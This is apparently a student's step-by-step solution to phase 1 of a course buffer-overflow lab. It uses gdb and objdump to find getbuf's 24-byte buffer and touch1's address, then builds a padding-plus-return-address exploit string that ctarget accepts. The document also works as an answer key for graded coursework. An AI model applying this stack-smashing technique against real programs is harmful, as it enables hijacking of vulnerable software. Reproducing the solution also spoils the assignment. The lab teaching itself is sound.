// Intro //

Phases 1-3 use the ctarget file 
4 & 5 uses rtarget file

ID.txt gives the cookie value.
my cookie value = 0x 75d6394e

when passing arguments, the first 6 arguments go to %rdi, %rsi, %rdx, %rcx, %r8, then %r9

The function Gets is similar to the standard library function gets—it reads a string from standard input
(terminated by ‘\n’ or end-of-file) and stores it (along with a null terminator) at the specified destination.
In this code, you can see that the destination is an array buf, declared as having BUFFER_SIZE bytes. At
the time your targets were generated, BUFFER_SIZE was a compile-time constant specific to your version
of the programs.



// Phase 1 //
Phase 1 is calling the function touch1. Phase 1 is overflowing the stack with an exploit string we will create,
then chnging the address of the getbuf function to the address of touch1 function.

To get started on first 3 phases, first we want to run ctarget in gdb, and set a breakpoint at getbuf:
While in the attacklab directory, type these into terminal, one after another:
  >>>gdb ctarget
  >>>break getbuf
Then disassemble the getbuf function:
  >>>disas getbuf
          Dump of assembler code for function getbuf:
             0x0000000000401780 <+0>:	sub    $0x18,%rsp
             0x0000000000401784 <+4>:	mov    %rsp,%rdi
             0x0000000000401787 <+7>:	callq  0x4019ba <Gets>
             0x000000000040178c <+12>:	mov    $0x1,%eax
             0x0000000000401791 <+17>:	add    $0x18,%rsp
             0x0000000000401795 <+21>:	retq   
          End of assembler dump.
          
Looking at the first instruction, we see there are 24 bytes (0x18) of buffer allocated for getbuf.
This tells us there needs to be 24 bytes of padding (Zeros in the beginning), followed by 
the return address of the touch1 address.


//Open a second terminal window, log in and go to attacklab directory again. Do the following in this window//
To find the address the touch1, you need to get the dissassembled code for ctarget file.
type this outside of the debugger, but inside the attacklab directory:
    >>> objdump -d rtarget > rtarget_dump.txt
To open this file, type:
    >>> cat rtarget_dump.txt
Use the Cntl-F find to find the touch1 function. Search 'touch1' inside rtarget, mine looks like this:
    0000000000401796 <touch1>:
      401796:	48 83 ec 08          	sub    $0x8,%rsp
      40179a:	c7 05 38 3d 20 00 01 	movl   $0x1,0x203d38(%rip)        # 6054dc <vlevel>
      4017a1:	00 00 00 
      4017a4:	bf 1e 30 40 00       	mov    $0x40301e,%edi
      4017a9:	e8 82 f4 ff ff       	callq  400c30 <puts@plt>
      4017ae:	bf 01 00 00 00       	mov    $0x1,%edi
      4017b3:	e8 21 05 00 00       	callq  401cd9 <validate>
      4017b8:	bf 00 00 00 00       	mov    $0x0,%edi
      4017bd:	e8 fe f5 ff ff       	callq  400dc0 <exit@plt>
 You should also see <touch2> and <touch3> somewhere below it. That will be for phase 2 and 3, 
 so keep this dissaembled rtarget window open until you finish.
 
 I see my address for touch1 is 0000000000401796, or 0x401796. This is touch1's memory address.
 When writing the bytes, we will write 96 17 40 for 401796, since the system is little endian.
 
 // back in the first window, quit the debugger //
 create a text file called phase1.txt
    >>> emacs phase1.txt
 the first 24 bytes will be padding, then the last line will be 
 the memory address written in little endian (bytes in reverse order):
      00 00 00 00 00 00 00 00
      00 00 00 00 00 00 00 00
      00 00 00 00 00 00 00 00
      96 17 40 00 00 00 00 00
 Save file and quit.
 Then, we will use this file and run it through the included porgram hex2raw, which will generate raw exploit strings:
      >>> ./hex2raw < phase1.txt > raw-phase1.txt

Finally, you run the raw file:
      >>> ./ctarget < raw-phase1.txt

You will get something like this if your solution is right:
    Cookie: 0x434b4b70 //your cookie will be different
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: Sent exploit string to server to be validated.
    NICE JOB!
 
 
